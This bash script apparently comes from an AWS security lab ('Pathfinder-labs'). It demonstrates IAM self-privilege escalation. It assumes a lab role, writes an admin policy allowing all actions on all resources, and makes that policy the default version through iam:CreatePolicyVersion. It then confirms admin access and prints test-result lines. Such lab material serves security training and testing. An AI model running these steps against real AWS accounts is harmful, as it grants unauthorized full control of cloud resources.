#!/bin/bash

# Demo script for prod_self_privesc_createPolicyVersion module
# This script demonstrates how to use the self-privilege escalation role

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}=== Pathfinder-labs Self-Privilege Escalation Demo (CreatePolicyVersion) ===${NC}"
echo "This demo shows how a role can escalate its own privileges by creating new policy versions"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed${NC}"
    exit 1
fi

# Disable paging for AWS CLI
export AWS_PAGER=""

# Role name and ARN (we'll construct the ARN since we can't get it via GetRole)
ROLE_NAME="pl-prod-self-privesc-createPolicyVersion-role-1"
ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-prod --query 'Account' --output text)
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ROLE_NAME}"

echo -e "${YELLOW}Step 1: Attempting to assume role${NC}"
echo "Role ARN: $ROLE_ARN"

# Policy ARN for privilege escalation
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/pl-prod-self-privesc-createPolicyVersion-policy"
echo "Policy ARN: $POLICY_ARN"

echo ""
echo -e "${YELLOW}Step 2: Assuming the role${NC}"
# Assume the role
ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "self-privesc-demo" --profile pl-pathfinder-starting-user-prod)
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role${NC}"

echo ""
echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
# Check what we can do currently
echo "Current caller identity:"
aws sts get-caller-identity


echo ""
echo -e "${YELLOW}Step 4: Creating new policy version with admin permissions (self-privilege escalation)${NC}"
# Create a new policy version with administrator access
cat > /tmp/admin-policy-version.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

echo "New policy version content:"
cat /tmp/admin-policy-version.json

# Create the new policy version
aws iam create-policy-version \
    --policy-arn "$POLICY_ARN" \
    --policy-document file:///tmp/admin-policy-version.json \
    --set-as-default

echo -e "${GREEN}✓ Successfully created new policy version with admin permissions${NC}"

echo ""
echo -e "${YELLOW}Step 5: Waiting for policy changes to propagate${NC}"
echo "Waiting 10 seconds for policy changes to propagate..."
sleep 10

echo ""
echo -e "${YELLOW}Step 6: Verifying privilege escalation${NC}"
# Verify the privilege escalation worked by listing IAM users (admin permission)
echo "Testing admin access by listing IAM users:"
aws iam list-users --max-items 5

echo ""
echo -e "${GREEN}✓ Privilege escalation successful!${NC}"
echo "The role now has administrator access through the new policy version."

echo ""
echo -e "${YELLOW}Step 7: Testing elevated permissions${NC}"
# Test that we now have elevated permissions
echo "Testing elevated permissions..."
if aws iam list-users &> /dev/null; then
    echo -e "${GREEN}✓ Can now list users (admin permission confirmed)${NC}"
else
    echo -e "${YELLOW}⚠ Could not list users (permissions may not have propagated yet)${NC}"
fi


# Standardized test results output
echo "TEST_RESULT:prod_self_privesc_createPolicyVersion:SUCCESS"
echo "TEST_DETAILS:prod_self_privesc_createPolicyVersion:Successfully escalated privileges using CreatePolicyVersion to create admin policy version"
echo "TEST_METRICS:prod_self_privesc_createPolicyVersion:policy_version_created=true,admin_access_gained=true"
# Clean up temp file
rm -f /tmp/admin-policy-version.json

echo ""
echo -e "${GREEN}=== Demo Complete ===${NC}"
echo "This demonstrates how a role with iam:CreatePolicyVersion on its own policy can escalate its own privileges."
echo ""
echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
echo "./cleanup_attack.sh"
